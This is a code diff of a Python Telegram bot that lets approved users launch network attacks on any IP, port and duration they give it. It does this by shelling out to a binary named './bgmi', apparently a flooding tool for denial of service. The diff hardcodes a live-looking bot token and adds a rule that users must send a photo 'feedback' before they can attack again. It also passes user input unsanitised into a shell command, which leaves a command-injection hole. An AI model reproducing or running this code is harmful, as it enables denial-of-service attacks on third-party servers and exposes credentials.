@@ -1,13 +1,13 @@
 import asyncio
-from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext
+from telegram import Update, InputFile
+from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
 import os
 
 # Configuration
-TELEGRAM_BOT_TOKEN = ("8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs")  # Fetch token from environment variable
+TELEGRAM_BOT_TOKEN = ("7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4")  # Fetch token from environment variable
 ADMIN_USER_ID = 1662672529
 APPROVED_IDS_FILE = 'approved_ids.txt'
-CHANNEL_ID = "@fyyffgggvvvgvvcc "  # Replace with your channel username
+CHANNEL_ID = "@gosjsisnsnsnsjan"  # Replace with your channel username
 attack_in_progress = False
 
 # Check if the token is set
@@ -19,14 +19,15 @@ def load_approved_ids():
     """Load approved user and group IDs from a file."""
     try:
         with open(APPROVED_IDS_FILE, 'r') as file:
-            return set(line.strip() for line in file.readlines())
+            return {line.split(',')[0].strip(): line.split(',')[1].strip() for line in file.readlines()}
     except FileNotFoundError:
-        return set()
+        return {}
 
 def save_approved_ids():
     """Save approved user and group IDs to a file."""
     with open(APPROVED_IDS_FILE, 'w') as file:
-        file.write("\n".join(approved_ids))
+        for user_id, feedback_status in approved_ids.items():
+            file.write(f"{user_id},{feedback_status}\n")
 
 approved_ids = load_approved_ids()
 
@@ -83,7 +84,6 @@ async def approve(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
         return
 
-    # Extract the target ID
     target_id = args[0].strip()
 
     # Validate that the target ID is a number
@@ -92,46 +92,10 @@ async def approve(update: Update, context: CallbackContext):
         return
 
     # Add the target ID to the approved list
-    approved_ids.add(target_id)
+    approved_ids[target_id] = 'no_feedback'
     save_approved_ids()
 
     await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')
-
-async def remove(update: Update, context: CallbackContext):
-    """Remove a user or group ID from the approved list."""
-    chat_id = update.effective_chat.id
-    args = context.args
-
-    if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
-        return
-
-    if len(args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
-        return
-
-    target_id = args[0].strip()
-    if target_id in approved_ids:
-        approved_ids.remove(target_id)
-        save_approved_ids()
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
-    else:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')
-
-async def alluser(update: Update, context: CallbackContext):
-    """List all approved users and groups."""
-    chat_id = update.effective_chat.id
-
-    if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
-        return
-
-    if not approved_ids:
-        await context.bot.send_message(chat_id=chat_id, text="*No approved users found.*", parse_mode='Markdown')
-        return
-
-    user_list = "\n".join(approved_ids)
-    await context.bot.send_message(chat_id=chat_id, text=f"*Approved Users and Groups:*\n\n{user_list}", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     """Launch an attack if the user is approved and a channel member."""
@@ -153,13 +117,17 @@ async def attack(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait for the current attack to finish.*", parse_mode='Markdown')
         return
 
+    if approved_ids[str(user_id)] == 'no_feedback':
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You must provide feedback (a photo) after your first attack to continue using the bot.*", parse_mode='Markdown')
+        return
+
     if len(args) != 3:
         await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
         return
 
     ip, port, time = args
     await context.bot.send_message(chat_id=chat_id, text=(
-        f"*✅ Attack Launched ✅*\n"
+        f"*✅ Attack Launched ✅*\n\n"
         f"*🎯 Target:* {ip}\n"
         f"*🔌 Port:* {port}\n"
         f"*⏱ Time:* {time} seconds\n"
@@ -174,7 +142,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./update {ip} {port} {time} 500",
+            f"./bgmi {ip} {port} {time} 500",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -191,7 +159,19 @@ async def run_attack(chat_id, ip, port, time, context):
     finally:
         attack_in_progress = False
         await context.bot.send_message(chat_id=chat_id, text="*♥️ Attack Finished ♥️*\n"
-                                                              "*send feedback to owner :- @GODxAloneBOY*", parse_mode='Markdown')
+                                                              "*Laude ab to attack bhi finish ho gaya feedback bhej*", parse_mode='Markdown')
+
+async def handle_feedback(update: Update, context: CallbackContext):
+    """Handle the feedback image."""
+    user_id = update.effective_user.id
+    file = update.message.photo[-1].get_file()  # Get the largest photo size
+    file_path = await file.download_to_drive(f"feedback_{user_id}.jpg")
+
+    # Update the user's feedback status
+    approved_ids[str(user_id)] = 'feedback_received'
+    save_approved_ids()
+
+    await update.message.reply_text("*✅ Feedback received. You can now initiate another attack.*")
 
 # Main Function
 def main():
@@ -201,9 +181,10 @@ def main():
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("approve", approve))
-    application.add_handler(CommandHandler("remove", remove))
-    application.add_handler(CommandHandler("alluser", alluser))
     application.add_handler(CommandHandler("attack", attack))
+    
+    # Message Handler for Feedback (photos)
+    application.add_handler(MessageHandler(filters.PHOTO, handle_feedback))
 
     application.run_polling()
 
